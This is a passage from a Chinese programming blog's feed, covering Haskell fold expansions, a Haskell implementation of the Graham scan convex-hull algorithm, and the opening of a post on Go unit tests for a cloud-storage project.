(foldr step id [a1, a2, a3]) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step a1 (step a2 (step a3 id))) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step a1 (step a2 (\z -&amp;gt; id (f z a3)))) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step a1 (\y -&amp;gt; (\z -&amp;gt; id (f z a3)) (f y a2))) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; (\y -&amp;gt; (\z -&amp;gt; id (f z a3)) (f y a2)) (f x a1)) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; (\y -&amp;gt; (\z -&amp;gt; f z a3) (f y a2)) (f x a1)) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; (\y -&amp;gt; f (f y a2) a3) (f x a1)) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; f (f (f x a1) a2) a3) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= f (f (f zero a1) a2) a3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在上面的展开过程中，首先按 &lt;code&gt;foldr&lt;/code&gt; 过程展开成一系列 &lt;code&gt;step&lt;/code&gt; 的叠加，之后从内向外逐步嵌套，成为一系列 &lt;code&gt;foldl&lt;/code&gt; 传入的折叠函数 &lt;code&gt;f&lt;/code&gt; 的组合：这个组合要计算的第一个直接子式（无需经过入栈、出栈即可计算出结果）接收 &lt;code&gt;foldl&lt;/code&gt; 传入的零值 &lt;code&gt;zero&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;同理，可以写出用 &lt;code&gt;foldl&lt;/code&gt; 实现 &lt;code&gt;foldr&amp;#39;&amp;#39;&lt;/code&gt; 具体的展开过程，仍以 &lt;code&gt;foldr&amp;#39;&amp;#39; f zero [a1, a2, a3]&lt;/code&gt; 为例，其展开过程如下：&lt;/p&gt;
&lt;p&gt;foldr’’ f z xs = foldl step id xs z&lt;br&gt;    where step g acc x = g (f acc x)&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldr&#39;&#39;&lt;/span&gt; f zero [a1, a2, a3]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (foldl step id [a1, a2, a3]) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step (step (step id a1) a2) a3) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step (step (\z -&amp;gt; id (f z a1)) a2) a3) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (step (\y -&amp;gt; (\z -&amp;gt; id (f z a1)) (f y a2)) a3) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; (\y -&amp;gt; (\z -&amp;gt;id (f z a1)) (f y a2)) (f x z3)) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; (\y -&amp;gt; f (f y a2) a1) (f x a3)) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= (\x -&amp;gt; f (f (f x a3) a2) a1) zero&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= f (f (f zero a3) a2) a1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;尽管二者可以互相表示，但仅仅是显式形式上的，其它隐式的性质仍然是形式所无法表征的。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/18/haskell-fold/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/18/haskell-fold/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/18/haskell-fold/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;分析 Haskell 中 &lt;code&gt;fold&lt;/code&gt; 系列函数。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Language" scheme="http://forec.github.io/categories/Language/"/>
    
    
      <category term="Haskell" scheme="http://forec.github.io/tags/Haskell/"/>
    
      <category term="sicp" scheme="http://forec.github.io/tags/sicp/"/>
    
      <category term="函数式编程" scheme="http://forec.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Haskell 的葛立恒扫描法</title>
    <link href="http://forec.github.io/2016/11/17/haskell-graham/"/>
    <id>http://forec.github.io/2016/11/17/haskell-graham/</id>
    <published>2016-11-17T15:50:20.000Z</published>
    <updated>2016-11-17T06:11:46.790Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;使用 Haskell 实现凸包葛立恒扫描法。最近在重温 Haskell，准备学习 Haskell 的并行编程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;相关链接&quot;&gt;&lt;a href=&quot;#相关链接&quot; class=&quot;headerlink&quot; title=&quot;相关链接&quot;&gt;&lt;/a&gt;相关链接&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Convex_hull&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;凸包（Wiki: Convex hull）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Graham_scan&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;葛立恒扫描法（Wiki: Graham scan）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;实现&quot;&gt;&lt;a href=&quot;#实现&quot; class=&quot;headerlink&quot; title=&quot;实现&quot;&gt;&lt;/a&gt;实现&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;计算折线 &lt;code&gt;&amp;lt;a, b, c&amp;gt;&lt;/code&gt; 方向时，使用有向面积判断：&lt;code&gt;(px b-px a)*(py c-py a)-(py b-py a)*(px c-px a)&lt;/code&gt;，若该面积大于 0 则为左转，等于 0 则为直线，否则右转。&lt;/li&gt;
&lt;li&gt;将顶点列表按与初始顶点 P0 的夹角排序时，可能遇到 Px 刚好与 P0 垂直，因此斜率无法计算。但可直接计算折线方向，根据方向判断出栈/入栈。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;typedef&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Direction&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;TurnLeft&lt;/span&gt; | &lt;span class=&quot;type&quot;&gt;TurnRight&lt;/span&gt; | &lt;span class=&quot;type&quot;&gt;Straight&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;deriving&lt;/span&gt; &lt;span class=&quot;container&quot;&gt;(&lt;span class=&quot;type&quot;&gt;Show&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Eq&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;typedef&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;container&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;title&quot;&gt;px&lt;/span&gt; :: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;title&quot;&gt;py&lt;/span&gt; :: &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;deriving&lt;/span&gt; &lt;span class=&quot;container&quot;&gt;(&lt;span class=&quot;type&quot;&gt;Show&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;calcTurn&lt;/span&gt; :: &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; -&amp;gt; &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; -&amp;gt; &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; -&amp;gt; &lt;span class=&quot;type&quot;&gt;Direction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;calcTurn&lt;/span&gt; a b c = &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; area == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Straight&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; area &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;TurnLeft&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;TurnRight&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        area = (px b-px a)*(py c-py a)-(py b-py a)*(px c-px a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p1&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p2&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p3&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p4&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p5&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; (-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p6&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;p7&lt;/span&gt; = &lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;points&lt;/span&gt; = [p1, p2, p3, p4, p5, p6, p7]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;graham&lt;/span&gt; :: [&lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt;] -&amp;gt; [&lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;graham&lt;/span&gt; graph = foldl makeStack [head . tail $ pList, p0] (tail . tail $ pList)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        p0 = head . sortBy yco $ graph&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        yco p1 p2 = &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; y1 == y2 &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; x1 &amp;lt; x2 &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;LT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;GT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; y1 &amp;lt; y2 &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;LT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;GT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                x1 = px p1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                x2 = px p2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                y1 = py p1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                y2 = py p2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pList = sortBy angle $ graph&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                angle p1 p2 = &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; dir == &lt;span class=&quot;type&quot;&gt;TurnLeft&lt;/span&gt; || dir == &lt;span class=&quot;type&quot;&gt;Straight&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;LT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;GT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt; dir = calcTurn p0 p1 p2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        makeStack [pa] pn = pn : [pa]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        makeStack acc@(pa:pb:ps) pn@(&lt;span class=&quot;type&quot;&gt;Point&lt;/span&gt; x y) = &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; dir == &lt;span class=&quot;type&quot;&gt;TurnLeft&lt;/span&gt; || dir == &lt;span class=&quot;type&quot;&gt;Straight&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; pn:acc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; makeStack (tail acc) pn&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                        dir = calcTurn pb pa pn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/17/haskell-graham/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/17/haskell-graham/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/17/haskell-graham/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;使用 Haskell 实现凸包葛立恒扫描法。最近在重温 Haskell，准备学习 Haskell 的并行编程。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Algorithms" scheme="http://forec.github.io/tags/Algorithms/"/>
    
      <category term="Haskell" scheme="http://forec.github.io/tags/Haskell/"/>
    
      <category term="函数式编程" scheme="http://forec.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>简易云存储系统传输、认证单元测试</title>
    <link href="http://forec.github.io/2016/11/16/cloud-storage-system-4/"/>
    <id>http://forec.github.io/2016/11/16/cloud-storage-system-4/</id>
    <published>2016-11-16T03:12:35.000Z</published>
    <updated>2016-11-19T15:20:06.549Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;编写传输和认证模块的单元测试。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;Golang 的单元测试需要导入 &lt;code&gt;testing&lt;/code&gt; 包，测试函数以 &lt;code&gt;Test&lt;/code&gt; 开头，且第一个参数为 &lt;code&gt;testing.T&lt;/code&gt;。通常我们设置一个对照列表，这个列表由二元组构成，分别是测试函数输入值和对应的正确输出值。我们编写 &lt;code&gt;verify&lt;/code&gt; 函数比对要测试函数的输出和正确输出，如果发现不同则该测试函数失败，并通过 &lt;code&gt;t.Errorf()&lt;/code&gt; 报告。&lt;/p&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; verify(t *testing.T, testnum &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;, testcase &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;, input, output, expected []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, err error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(expected) != &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(output) || err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;%d. %s with input = %s: output %s != %s&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			testnum,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			testcase,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(input),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(output),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(expected))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;认证模块单元测试&quot;&gt;&lt;a href=&quot;#认证模块单元测试&quot; class=&quot;headerlink&quot; title=&quot;认证模块单元测试&quot;&gt;&lt;/a&gt;认证模块单元测试&lt;/h1&gt;&lt;ul&gt;
